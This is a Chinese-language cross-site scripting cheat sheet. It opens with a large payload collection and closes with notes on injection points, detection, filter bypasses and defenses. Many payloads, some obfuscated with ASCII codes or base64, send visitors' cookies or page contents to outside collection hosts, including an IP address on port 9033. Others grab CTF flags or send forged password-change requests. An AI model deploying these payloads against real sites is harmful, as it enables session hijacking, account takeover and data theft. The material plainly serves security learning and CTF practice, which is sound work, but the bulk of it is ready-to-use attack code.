# XSS测试脚本集合

## 基础XSS Payloads

### 1. 基本弹窗
```html
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert('XSS')>
```

### 2. 闭合标签
```html
'><script>alert('XSS')</script>
"><script>alert('XSS')</script>
```

### 3. 事件处理器
```html
<img src=x onerror=alert('XSS')>
<div onmouseover="alert('XSS')">hover me</div>
```

## 绕过过滤的Payloads

### 1. 使用HTML实体编码
```html
&#39; onclick=&#34;alert(&#39;XSS&#39;)&#34;
```

### 2. 使用Unicode编码
```html
\u0027 onclick=\u0022alert(\u0027XSS\u0027)\u0022
```

### 3. 使用URL编码
```html
%27%20onclick%3D%22alert%28%27XSS%27%29%22
```

## XSS Hunter Payloads

### 1. 基本XSS Hunter
```html
'><img src=x onerror="fetch('https://js.rip/20njahuoqt?c='+btoa(document.cookie))">
```

### 2. 使用base64编码
```html
'><img src=x id=ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vanMucmlwLzIwbmphaHVvcXQn onerror=eval(atob(this.id))>
```

### 3. 使用Image对象
```html
'><img src=x onerror="new Image().src='https://js.rip/20njahuoqt'">
```

## DOM型XSS Payloads

### 1. 基本DOM XSS
```html
' onclick="alert('XSS')"
```

### 2. 使用JavaScript事件
```html
' onmouseover="alert('XSS')"
```

### 3. 使用动态脚本
```html
'><script>var s=document.createElement('script');s.src='https://js.rip/20njahuoqt';document.body.appendChild(s);</script>
```

## 攻击脚本
```html
<script>标签：<script>标签是最直接的XSS有效载荷, 脚本标记可以引用外部的JavaScript代码,也可以将代码插入脚本标记中
	-----------------------------
	 <script>alert("hello")</script>   #弹出hello
	 <script>alert(/hello/)</script>   #弹出hello
	 <script>alert(1)</script>        #弹出1,对于数字可以不用引号
	 <script>alert(document.cookie)</script>      #弹出cookie
	 <script src=http://xxx.com/xss.js></script>  #引用外部的xss
     <script>window.location.href="http://www.8fc85e6220bc.space/collect?cookie="+document.cookie</script>
     <script>window.location.href="http://www.8fc85e6220bc.space/collect?cookie="+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)</script>
<script>window.open="http://www.8fc85e6220bc.space/collect?cookie="+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)</script>
    K: <script>document.location.href="http://www.8fc85e6220bc.space/collect?cookie="+document.cookie</script>
下面是K：对应的ASCII码{60,115,99,114,105,112,116,62,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,119,119,119,46,56,102,99,56,53,101,54,50,50,48,98,99,46,115,112,97,99,101,47,99,111,108,108,101,99,116,63,99,111,111,107}
可以用以下javascript脚本生成：
const input = '<script>document.location.href="http://www.8fc85e6220bc.space/collect?cookie="+document.cookie</script>';
const asciiCodes = Array.from(input).map(char => char.charCodeAt(0));
const result = asciiCodes.join(',');
console.log(result);
生成ASCII后可以用以下脚本：
<body/**/οnlοad=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,119,119,119,46,56,102,99,56,53,101,54,50,50,48,98,99,46,115,112,97,99,101,47,99,111,108,108,101,99,116,63,99,111,111,107));>





	------------------------------
 <svg>标签：
	------------------------------
	 <svg onload="alert(1)">
	 <svg onload="alert(1)"//
     <svg onload="location.href='http://www.8fc85e6220bc.space/collect?c='+document.cookie"/>
	------------------------------
 <img>标签：
	------------------------------
	 <img  src=1  οnerrοr=alert("hack")>
	 <img  src=1  οnerrοr=alert(document.cookie)>  #弹出cookie
     <img src="" οnerrοr=location.href="http://www.8fc85e6220bc.space/collect?cookie="+document.cookie>

	------------------------------
<body>标签：
	------------------------------
	 <body οnlοad=alert(1)>
	 <body οnpageshοw=alert(1)>
     <body onload=location.href='http://www.8fc85e6220bc.space/collect?cookie='+document.cookie></body>
     <body/**/onload=location.href='http://www.8fc85e6220bc.space/collect?cookie='+document.cookie></body>
     <body/onload=location.href='http://www.8fc85e6220bc.space/collect?cookie='+document.cookie></body>
	------------------------------
<video>标签：
	------------------------------
	 <video οnlοadstart=alert(1) src="/media/hack-the-planet.mp4" />
	------------------------------
<Style>标签：
	------------------------------
	 <style οnlοad=alert(1)></style>
	------------------------------
<iframe onload=document.location='http://www.8fc85e6220bc.space/collect?cookie='+document.cookie>'
-----------------------------------------------
    空格过滤：用【/**/】
------------------------------------------------
    
    


```

  [nc来监控](https://blog.csdn.net/Jayjay___/article/details/133375048)

```javascript
<script>window.open('http://43.154.113.116:9033/'+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)</script>

<script>$('div.layui-table-cell.laytable-cell-1-0-1').each(function(index,value){if(value.innerHTML.indexOf('ctfshow{')>-1){window.location.href='http://43.154.113.116:9033/'+value.innerHTML;}});</script>

<script>$('div.layui-table-cell.laytable-cell-1-0-1').each(function (index, value) {if ((value.innerHTML.indexOf('ctfshow{') > -1)&&(value.innerHTML.indexOf('script') === -1)) {window.location.href = 'http://43.154.113.116:9033/' +value.innerHTML;}});</script>

<script>var img = new Image();img.src = "http://43.154.113.116:9033/"+document.querySelector('#top > div.layui-container > div:nth-child(4) > div > div.layui-table-box > div.layui-table-body.layui-table-main').textContent;document.body.append(img);</script>

<script>window.location.href='http://127.0.0.1/api/change.php?p=1111111';</script>

<script>$.ajax({url:"api/change.php",method:"POST",data:{'p':'1717'}})</script>

<script>var httpRequest = new XMLHttpRequest();httpRequest.open('POST', 'http://127.0.0.1/api/change.php', true);httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");httpRequest.send('p=1234567');</script>

<script>$.ajax({url:"api/amount.php",method:"POST",data:{'u':'1','a':}})</script>
                
<script>window.open('http://43.154.113.116:9033/'+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)</script>

<script>$('div.layui-table-cell.laytable-cell-1-0-1').each(function(index,value){if(value.innerHTML.indexOf('ctfshow{')>-1){window.location.href='http://43.154.113.116:9033/'+value.innerHTML;}});</script>
```









## XSS可以插入的地方

```html
 *用户输入作为script标签内容
 *用户输入作为HTML注释内容
 *用户输入作为HTML标签的属性名
 *用户输入作为HTML标签的属性值
 *用户输入作为HTML标签的名字
 *直接插入到CSS里
 
 **通过上述可插入的位置可知：千万不要引入任何不可信的第三方JavaScript到页面里！
----------------------------------
#用户输入作为HTML注释内容,导致攻击者可以进行闭合绕过
 <!-- 用户输入 -->
 <!-- --><script>alert('hack')</script><!-- -->
 
 #用户输入作为标签属性名,导致攻击者可以进行闭合绕过
 <div 用户输入="xx">  </div>
 <div ></div><script>alert('hack')</script><div a="xx"> </div>
 
 #用户输入作为标签属性值,导致攻击者可以进行闭合绕过
 <div id="用户输入"></div>
 <div id=""></div><script>alert('hack')</script><div a="x"></div>
 
 #用户输入作为标签名,导致攻击者可以进行闭合绕过
 <用户输入  id="xx" />
 <><script>alert('hack')</script><b id="xx" />
 
 #用户输入作为CSS内容,导致攻击者可以进行闭合绕过
 <style>用户输入<style>
 <style> </style><script>alert('hack')</script><style> </style>
----------------------------------

```

## XSS漏洞的挖掘
```html
 黑盒测试：
	 尽可能找到一切用户可控并且能够输出在页面代码中的地方,比如下面这些：
	 *URL的每一个参数
	 *URL本身
	 *表单
	 *搜索框
---------------------
 常见业务场景：
	 *重灾区：评论区、留言区、个人信息、订单信息等
	 *针对型：站内信、网页即时通讯、私信、意见反馈
	 *存在风险：搜索框、当前目录、图片属性等
----------------------
 白盒测试(代码审计)：
	 关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手：
		 PHP中常见的接受参数$_GET、$_POST、$_REQUEST等,可以搜索所有接受参数的地方,然后对收到的数据进行跟踪,看看有没有输出到页面中,然后看输出到页面的数据是否进行了过滤和编码等处理。
	     也可以搜索类似echo这样的输出语句,跟踪输出的变量是从哪里来的,我们能否控制,如果从数据库中取的,是否控制存到数据库中的数据,存到数据之前有没有进行过滤等。
	     大多数程序会对接受参数封装在公共文件的函数中同一调用,我们就要审计这些公共函数看看有没有过滤,能否绕过等。
	 同理审计DOM-XSS可以搜索一些js操作DOM元素的关键字进行审计。
----------------------

```

#### 漏洞查找

##### 基本验证

将以下代码作为 Fuzz 测试样本，尝试提交到所有可能接收用户输入的地方，如 HTTP 头、URL 参数、前端表单等。

```javascript
"><script>alert(document.cookie)</script>
```

如果发现攻击字符串原样出现在响应中，则可能存在 XSS 漏洞。

许多应用会尝试通过黑名单等简单方式进行初步过滤来阻止 XSS 攻击，但这类防御往往不够严密，可以通过编码或构造变形的方式进行绕过，例如：

```javascript
"><ScRiPt>alert(document.cookie)</ScRiPt>

// 利用大小写混淆绕过过滤（部分过滤器只匹配小写关键词）

"%3e%3cscript%3ealert(document.cookie)%3c/script%3e
// 完整使用 URL 编码（%3e = '>'，%3c = '<'），绕过对特殊字符的拦截

"><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
// 利用标签嵌套的方式绕过过滤器，例如将 <script> 拆分成多段

%00"><script>alert(document.cookie)</script>

// 在前面插入空字节（%00），绕过部分语言或框架在处理字符串时的截断问题
```

当利用基于 DOM 的 XSS 漏洞时，攻击载荷不会出现在服务器的响应内容中，而是被直接保存在浏览器端的 DOM 结构中，并通过客户端的 JavaScript 脚本进行处理和执行。

在这种情况下，以上所提的基本验证方式（如检测响应中是否出现攻击字符串）将无法发现此类 XSS 漏洞。因为漏洞的触发完全发生在客户端执行 JavaScript 的过程中，而非依赖于服务端的返回内容。

##### 反射型 XSS 查找

###### 1.基本的反射型 XSS 测试

将以下恶意脚本注入页面的各个参数中，观察是否被反射回页面并执行：

```javascript
"><script>alert(document.cookie)</script>
```

若字符串原样出现在页面响应中，可能存在反射型 XSS。

###### 2. 常见注入位置与方法

---

###### 2.1 标签属性值注入

**示例返回页面：**

```html
<input type="text" name="name" value="test-text">
```

**注入方式：**

```html
" autofocus onfocus=alert(1) x="
```

或更常见的：

```html
"><script>alert(1)</script>
```

**说明：**  
用户输入直接插入到 HTML 属性中，若没有进行转义或过滤，攻击者可以闭合属性并插入恶意脚本。

---

###### 2.2 JavaScript 字符串上下文注入

**示例返回页面：**

```html
<script>var a = 'test-text';</script>
```

**注入方式：**

```javascript
';alert(1);// 
```

**说明：**  
当用户输入出现在 JavaScript 字符串中时，可通过闭合字符串并插入脚本的方式执行任意 JS 代码。

---

###### 2.3 URL 属性注入

**示例返回页面：**

```html
<a href="test-text">Click here</a>
```

**注入方式：**

```html
<a href="javascript:alert(1)">Click here</a>
```

**说明：**  
如果用户可控内容被插入到 URL 属性中，可能造成点击劫持、脚本执行等安全问题。应避免使用 `javascript:` 协议或进行严格的 URL 白名单过滤。

###### 3.利用常见标签和属性触发脚本执行

3.1 无需用户交互的事件属性

```html
```javascript
<!-- 正确写法如下 -->
<object data="1" onerror="alert(1)"></object>

<img src="valid.gif" onload="alert(1)">

<!-- 正确写法如下（但 input 不支持 onreadystatechange） -->
<input type="image" src="valid.gif" onload="alert(1)">

<!-- 使用 video 标签的 onerror 属性触发 JS -->
<video src="invalid.mp4" onerror="alert(1)"></video>

<!-- 使用 audio 标签的 onerror 属性触发 JS -->
<audio src="invalid.mp3" onerror="alert(1)"></audio>

```

| 标签       | 属性      | 状态/浏览器支持        | 说明                       |
| ---------- | --------- | ---------------------- | -------------------------- |
| `<object>` | `onerror` | 一般有效               | 正确写法需指定 `data` 属性 |
| `<img>`    | `onload`  | 通用有效               | 常用 XSS 向量              |
| `<input>`  | `onload`  | 仅 `type="image"` 有效 | 否则不触发                 |
| `<video>`  | `onerror` | 通用有效               | 视频加载失败可触发         |
| `<audio>`  | `onerror` | 通用有效               | 音频加载失败可触发         |

3.2 脚本伪协议注入



```javascript
<!-- 使用 <object> 标签，data 属性为 JavaScript 协议 -->
<object data="javascript:alert(1)"></object>

<!-- 使用 <iframe> 标签，src 属性为 JavaScript 协议 -->
<iframe src="javascript:alert(1)"></iframe>

<!-- 使用伪标签 <event-source>，src 为 JavaScript 协议（无效） -->
<event-source src="javascript:alert(1)"></event-source>

```

###### 4.HTML 绕过技巧

4.1 标签名绕过

-  大小写混淆：`<iMg onerror=alert(1) src=a>`

-  插入 NULL 字节：`<%00img onerror=alert(1) src=a>`

- 空格替代字符：

```javascript
<img%09onerror=alert(1) src=a>  <!-- Tab -->
<img%0aonerror=alert(1) src=a>  <!-- 换行 -->
<img/"onerror=alert(1) src=a>   <!-- 异常语法 -->
```

4.2 属性名绕过

```plain
<img o%00nerror=alert(1) src=a>
```

4.3 属性分隔绕过

```javascript
<imgonerror='alert(1)'src=a>
```

4.4 属性值编码绕过

```javascript
<imgonerror=a%00lert(1) src=a>
<imgonerror=a&#x006c;ert(1) src=a>
```

###### 4.5 可编码属性（常用于 XSS 编码绕过）

这些属性可以被用于注入 JavaScript 代码，某些属性支持 `base64` 编码或 `javascript:` 协议，可用于绕过 WAF 或过滤器。

------

###### 🔗 URL 类型属性（支持 `javascript:` 协议）

- `href=` — 常用于 `<a>`、`<link>` 等标签中
- `action=` — 表单提交地址
- `formaction=` — 按钮指定的提交地址
- `location=` — 一些框架或 JS 上下文中可被利用

------

###### 🖼️ 资源加载类属性（支持 base64 或外链）

- `src=` — 如 `<img>`、`<script>`、`<iframe>` 等
- `data=` — 如 `<object>`，支持 `data:base64` 格式
- `poster=` — `<video>` 首帧图
- `background=` — `<body>`、`<table>` 背景图
- `code=` — Applet 使用的参数（老旧技术）

------

###### ⚙️ 脚本执行类属性

- `on*=` — 所有以 `on` 开头的事件处理属性，如 `onclick=`, `onerror=` 等

------

###### 🧩 其他可注入属性

- `name=` — 某些上下文中可影响元素行为或作为关键属性被 JS 引用

------

###### ✅ 温馨提示

实际注入中是否能触发代码执行，还需结合标签上下文、浏览器解析行为及 CSP 等安全策略来判断。


###### 5. 绕过字符集与长度限制

**5.1 使用非标准编码：**

- `UTF-7`
- `US-ASCII`
- `UTF-16`

**5.2 拆分跨站脚本（用于绕过长度限制）：**
```javascript
<script>
  z='<script src=';
  z+='test.c';
  z+='n/1.js><\/script>';
  document.write(z);
</script>
```
执行结果为：
```html
<script src=test.cn/1.js></script>
```

###### 6. JavaScript 层面的绕过技巧

**6.1 Unicode 编码关键字：**
```javascript
<script>a\u006cert(1)</script>
<script>eval('a\u006cert(1)')</script>
```

**6.2 替代点操作符 `.`：**
```javascript
<script>alert(document['cookie'])</script>
<script>with(document)alert(cookie)</script>
```

##### 存储型 XSS 查找

保存型 XSS 漏洞的检测过程与反射型相似，但有关键区别：

###### 提交特殊字符串后进行反复检查

需在多个页面中反复验证注入点是否触发 XSS。

###### 检查管理员区域

重点检查是否有普通用户控制的数据被管理员访问（如日志记录等）。

###### 检查带外通道

如 HTTP Header、Referer 等是否被回显或用于页面输出。

##### DOM 型的 XSS 漏洞查找

漏洞存在于客户端 JavaScript 中，以下是检测重点：

###### 检查危险的 DOM 属性和 API：

- `document.location`
- `document.URL`
- `document.URLUnencoded`
- `document.referrer`
- `window.location`

###### 检查危险的 JavaScript 操作：

- `document.write()` / `document.writeln()`
- `document.body.innerHTML`
- `eval()`
- `window.execScript()`
- `window.setInterval()` / `window.setTimeout()`

###### 注意 URL 片段：

如 `#` 后的数据通过 DOM 被访问并执行。

#### 漏洞防御

##### 反射型与存储型 XSS 防御：

###### 确认输入：

- **数据长度控制**
- **合法字符限制**
- **正则表达式匹配**

###### 确认输出：

- **HTML 编码**

###### 消除危险插入点：

- 避免直接插入到 JavaScript 中
- 避免嵌入到属性中

###### 允许有限 HTML：

使用如 OWASP AntiSamy 来控制 HTML 标签白名单。

##### DOM 型防御：

###### 确认输入（客户端验证）：

```javascript
<script>
    var a = document.URL;
    a = a.substring(a.indexOf("message=") + 8);
    a = unescape(a);
    var regex = /^([A-Za-z0-9\s]+)$/;
    if (regex.test(a)) {
        document.write(a);
    }
</script>
```

###### 服务端验证：

- 限制参数数量和格式

###### 确认输出（编码）：

```javascript
function reinit(str) {
    var d = document.createElement('div');
    d.appendChild(document.createTextNode(str));
    return d.innerHTML;
}
```


## 参考文章
[DVWA学习之XSS（跨站脚本攻击）（超级详细）](https://blog.csdn.net/weixin_40950781/article/details/100007103)

XSS漏洞（全网最详细）https://blog.csdn.net/qq_61553520/article/details/130268475

Web 安全头号大敌 XSS 漏洞解决最佳实践https://cloud.tencent.com/developer/article/1790802

XSS跨站脚本漏洞https://wiki.wgpsec.org/knowledge/web/xss.html

XSS靶场http://ctf.aabyss.cn/xss-labs/index.php